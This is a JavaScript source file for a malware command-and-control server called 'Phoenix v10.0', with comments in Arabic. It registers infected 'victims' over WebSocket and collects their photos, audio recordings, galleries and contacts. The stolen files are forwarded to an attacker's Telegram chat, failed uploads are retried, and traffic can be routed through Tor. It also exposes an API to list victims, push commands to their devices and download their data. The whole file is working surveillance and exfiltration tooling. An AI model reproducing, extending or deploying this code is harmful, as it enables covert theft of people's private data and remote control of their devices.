// ===================================================================
// Phoenix v10.0 - C2 Server (Production Ready)
// ===================================================================
const express = require('express');
const WebSocket = require('ws');
const cors = require('cors');
const dotenv = require('dotenv');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { loadOrGenerateKeys, shouldRenewKeys, renewKeys } = require('./keys-manager');
const TelegramSender = require('./telegram-sender');
const StealthTransport = require('./stealth-transport');
const { saveVictimData, hideDataInBMP } = require('./storage');
const { processCommand } = require('./commands');
const { startTor, getTorAgent } = require('./tor-helper');

dotenv.config();

// ===================================================================
// CONFIGURATION
// ===================================================================
const CONFIG = {
    WS_PORT: parseInt(process.env.WS_PORT) || 8080,
    HTTP_PORT: parseInt(process.env.HTTP_PORT) || 8081,
    TELEGRAM_TOKEN: process.env.TELEGRAM_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
    STORAGE_PATH: process.env.STORAGE_PATH || './data',
    TOR_ENABLED: process.env.TOR_ENABLED === 'true',
    CHUNK_SIZE: parseInt(process.env.TELEGRAM_CHUNK_SIZE) || 1.5 * 1024 * 1024 * 1024,
    SALT: process.env.SALT || 'Phoenix_Salt_2026_Strong',
};

// ===================================================================
// KEYS
// ===================================================================
let { publicKey, privateKey, generatedAt } = loadOrGenerateKeys();

// تجديد المفاتيح كل 30 يوماً
setInterval(() => {
    if (shouldRenewKeys(generatedAt)) {
        const newKeys = renewKeys();
        publicKey = newKeys.publicKey;
        privateKey = newKeys.privateKey;
        generatedAt = newKeys.generatedAt;
        console.log('[+] Keys renewed successfully.');
    }
}, 24 * 60 * 60 * 1000);

// ===================================================================
// TELEGRAM SENDER
// ===================================================================
const telegram = new TelegramSender(
    CONFIG.TELEGRAM_TOKEN,
    CONFIG.TELEGRAM_CHAT_ID,
    {
        useTor: CONFIG.TOR_ENABLED,
        chunkSize: CONFIG.CHUNK_SIZE,
        retries: 3,
        retryDelay: 5000,
    }
);

// ===================================================================
// STEALTH TRANSPORT (SSE + HTTP/2)
// ===================================================================
const transport = new StealthTransport();
transport.events.on('data', async ({ victimId, data, type }) => {
    const filePath = saveVictimData(victimId, data, type);
    try {
        await telegram.sendFile(filePath, `${victimId}_${Date.now()}.bin`, `📦 Data from ${victimId}`);
    } catch (error) {
        console.error('[!] Telegram error:', error.message);
        // إعادة المحاولة لاحقاً (حفظ في قائمة الانتظار)
        queueFailedUpload(victimId, filePath, `${victimId}_${Date.now()}.bin`);
    }
});

// ===================================================================
// قائمة انتظار للرفع الفاشل
// ===================================================================
const pendingUploads = [];

function queueFailedUpload(victimId, filePath, filename) {
    pendingUploads.push({
        victimId,
        filePath,
        filename,
        attempts: 0,
        nextAttempt: Date.now() + 300000, // 5 دقائق
    });
}

// حلقة خلفية لإعادة المحاولة كل دقيقة
setInterval(async () => {
    const now = Date.now();
    for (let i = pendingUploads.length - 1; i >= 0; i--) {
        const upload = pendingUploads[i];
        if (upload.nextAttempt <= now && upload.attempts < 3) {
            try {
                await telegram.sendFile(upload.filePath, upload.filename);
                // حذف من قائمة الانتظار بعد النجاح
                pendingUploads.splice(i, 1);
                if (fs.existsSync(upload.filePath)) {
                    fs.unlinkSync(upload.filePath);
                }
            } catch (error) {
                upload.attempts++;
                upload.nextAttempt = Date.now() + 300000 * upload.attempts;
                console.warn(`[!] Retry ${upload.attempts}/${3} for ${upload.filename}`);
            }
        }
    }
}, 60000);

// ===================================================================
// HTTP SERVER (مع واجهة API)
// ===================================================================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// نقاط النهاية
app.get('/', (req, res) => res.send('Phoenix v10.0 C2 Server'));

// قائمة الضحايا
app.get('/api/victims', (req, res) => {
    const victims = [];
    const dataDir = CONFIG.STORAGE_PATH;
    if (fs.existsSync(dataDir)) {
        const dirs = fs.readdirSync(dataDir);
        for (const dir of dirs) {
            const fullPath = path.join(dataDir, dir);
            if (fs.statSync(fullPath).isDirectory()) {
                const files = fs.readdirSync(fullPath).filter(f => f.endsWith('.enc'));
                victims.push({
                    id: dir,
                    files: files.length,
                    lastSeen: fs.statSync(fullPath).mtimeMs,
                });
            }
        }
    }
    res.json({ victims });
});

// إرسال أمر إلى ضحية
app.post('/api/command', async (req, res) => {
    const { victimId, command } = req.body;
    if (!victimId || !command) return res.status(400).json({ error: 'Missing params' });
    await processCommand(victimId, command);
    res.json({ status: 'queued' });
});

// إرسال جميع بيانات ضحية معينة إلى Telegram
app.post('/api/send-to-telegram', async (req, res) => {
    const { victimId } = req.body;
    if (!victimId) return res.status(400).json({ error: 'Victim ID required' });

    const storagePath = path.join(CONFIG.STORAGE_PATH, victimId);
    if (!fs.existsSync(storagePath)) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    const files = fs.readdirSync(storagePath).filter(f => f.endsWith('.enc'));
    const results = [];

    for (const file of files) {
        const fullPath = path.join(storagePath, file);
        try {
            await telegram.sendFile(fullPath, `${victimId}_${file}`, `📦 Data from ${victimId}`);
            results.push({ file, status: 'sent' });
            // حذف الملف بعد الإرسال (اختياري)
            // fs.unlinkSync(fullPath);
        } catch (error) {
            results.push({ file, status: 'failed', error: error.message });
        }
    }

    res.json({
        status: 'completed',
        victimId,
        total: files.length,
        results,
    });
});

// تنزيل ملف من الضحية
app.get('/api/download/:victimId/:filename', (req, res) => {
    const { victimId, filename } = req.params;
    const fullPath = path.join(CONFIG.STORAGE_PATH, victimId, filename);
    if (!fs.existsSync(fullPath)) {
        return res.status(404).json({ error: 'File not found' });
    }
    res.download(fullPath);
});

app.listen(CONFIG.HTTP_PORT, () => {
    console.log(`[+] HTTP server on port ${CONFIG.HTTP_PORT}`);
});

// ===================================================================
// WEBSOCKET SERVER (للتواصل مع الضحايا)
// ===================================================================
const wss = new WebSocket.Server({ port: CONFIG.WS_PORT });
console.log(`[+] WebSocket server on port ${CONFIG.WS_PORT}`);

// تخزين جلسات الضحايا النشطة
const victimSessions = new Map(); // victimId -> ws

wss.on('connection', (ws) => {
    let victimId = null;
    let sessionKey = null;

    ws.on('message', async (message) => {
        try {
            const parsed = JSON.parse(message);
            const type = parsed.type;

            // ============================================================
            // 1. تسجيل ضحية جديدة
            // ============================================================
            if (type === 'register') {
                // فك تشفير victimId (باستخدام المفتاح الخاص)
                // في الإنتاج، يتم فك التشفير باستخدام privateKey
                victimId = parsed.victimId || `victim_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
                sessionKey = parsed.sessionKey || crypto.randomBytes(32).toString('hex');

                // حفظ الجلسة
                victimSessions.set(victimId, { ws, sessionKey, lastSeen: Date.now() });

                // إنشاء مجلد الضحية
                const victimDir = path.join(CONFIG.STORAGE_PATH, victimId);
                if (!fs.existsSync(victimDir)) {
                    fs.mkdirSync(victimDir, { recursive: true });
                }

                console.log(`[+] New victim registered: ${victimId}`);
                ws.send(JSON.stringify({ type: 'ack', status: 'registered', victimId }));

                // إرسال إشعار إلى Telegram
                await telegram.sendText(
                    `🚀 New victim connected\nID: ${victimId}\nUA: ${parsed.ua || 'Unknown'}\nPlatform: ${parsed.platform || 'Unknown'}`,
                    `📡 New Victim: ${victimId}`
                );
                return;
            }

            // ============================================================
            // 2. استقبال بيانات (صور، صوت، فيديو، جهات اتصال)
            // ============================================================
            if (type === 'photo' || type === 'audio' || type === 'gallery' || type === 'contacts' || type === 'meta') {
                if (!victimId) {
                    ws.send(JSON.stringify({ type: 'error', message: 'Not registered' }));
                    return;
                }

                // فك تشفير البيانات (باستخدام sessionKey)
                // في الإنتاج، يتم فك التشفير باستخدام AES-GCM مع sessionKey
                let payload = parsed.data;
                if (typeof payload === 'string') {
                    try {
                        payload = JSON.parse(payload);
                    } catch (e) {
                        // إذا لم تكن JSON، نعتبرها بيانات خام
                    }
                }

                // حفظ البيانات (باستخدام storage.js)
                const filename = `${type}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}.bin`;
                const filePath = path.join(CONFIG.STORAGE_PATH, victimId, filename);
                const dataBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(JSON.stringify(payload));
                fs.writeFileSync(filePath, dataBuffer);

                console.log(`[+] Saved ${type} from ${victimId}: ${filename} (${dataBuffer.length} bytes)`);

                // إرسال إلى Telegram (مع تقسيم تلقائي)
                try {
                    await telegram.sendFile(filePath, `${victimId}_${filename}`, `📸 ${type} from ${victimId}`);
                    // حذف الملف بعد الإرسال (اختياري)
                    // fs.unlinkSync(filePath);
                } catch (error) {
                    console.error('[!] Telegram error:', error.message);
                    queueFailedUpload(victimId, filePath, `${victimId}_${filename}`);
                }

                // تأكيد الاستلام
                ws.send(JSON.stringify({ type: 'ack', status: 'received', filename }));
                return;
            }

            // ============================================================
            // 3. نبضات القلب (Heartbeat)
            // ============================================================
            if (type === 'ping') {
                if (victimId && victimSessions.has(victimId)) {
                    victimSessions.get(victimId).lastSeen = Date.now();
                }
                ws.send(JSON.stringify({ type: 'pong' }));
                return;
            }

            // ============================================================
            // 4. تنفيذ أمر (من المهاجم)
            // ============================================================
            if (type === 'command_response') {
                const { commandId, result } = parsed;
                console.log(`[+] Command ${commandId} executed by ${victimId}: ${result}`);
                return;
            }

            // ============================================================
            // 5. أمر غير معروف
            // ============================================================
            ws.send(JSON.stringify({ type: 'error', message: 'Unknown command type' }));

        } catch (error) {
            console.error('[!] WebSocket error:', error.message);
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'error', message: 'Invalid data format' }));
            }
        }
    });

    // ============================================================
    // عند قطع الاتصال
    // ============================================================
    ws.on('close', () => {
        if (victimId) {
            victimSessions.delete(victimId);
            console.log(`[-] Victim disconnected: ${victimId}`);
        }
    });

    // ============================================================
    // عند حدوث خطأ في WebSocket
    // ============================================================
    ws.on('error', (error) => {
        console.error('[!] WebSocket error:', error.message);
        if (victimId) {
            victimSessions.delete(victimId);
        }
    });
});

// ===================================================================
// دالة لإرسال أوامر إلى ضحية معينة (من المهاجم)
// ===================================================================
async function sendCommandToVictim(victimId, command, commandId = null) {
    const session = victimSessions.get(victimId);
    if (!session) {
        throw new Error(`Victim ${victimId} not connected`);
    }

    const ws = session.ws;
    if (ws.readyState !== WebSocket.OPEN) {
        throw new Error(`Victim ${victimId} websocket not open`);
    }

    const payload = {
        type: 'command',
        commandId: commandId || `cmd_${Date.now()}`,
        command: command,
    };
    ws.send(JSON.stringify(payload));
    return payload.commandId;
}

// ===================================================================
// TOR START
// ===================================================================
if (CONFIG.TOR_ENABLED) {
    try {
        startTor();
        console.log('[+] Tor started successfully.');
    } catch (error) {
        console.error('[!] Tor start failed:', error.message);
    }
}

// ===================================================================
// تسجيل الخادم في وحدة التحكم
// ===================================================================
console.log(`[+] Phoenix v10.0 C2 Server is running.`);
console.log(`[+] HTTP: http://localhost:${CONFIG.HTTP_PORT}`);
console.log(`[+] WebSocket: ws://localhost:${CONFIG.WS_PORT}`);
console.log(`[+] Storage: ${CONFIG.STORAGE_PATH}`);
console.log(`[+] Tor: ${CONFIG.TOR_ENABLED ? 'Enabled' : 'Disabled'}`);
console.log('[+] Waiting for victims...');

// ===================================================================
// تصدير الوظائف للاستخدام الخارجي
// ===================================================================
module.exports = {
    app,
    wss,
    victimSessions,
    sendCommandToVictim,
    telegram,
    CONFIG,
};
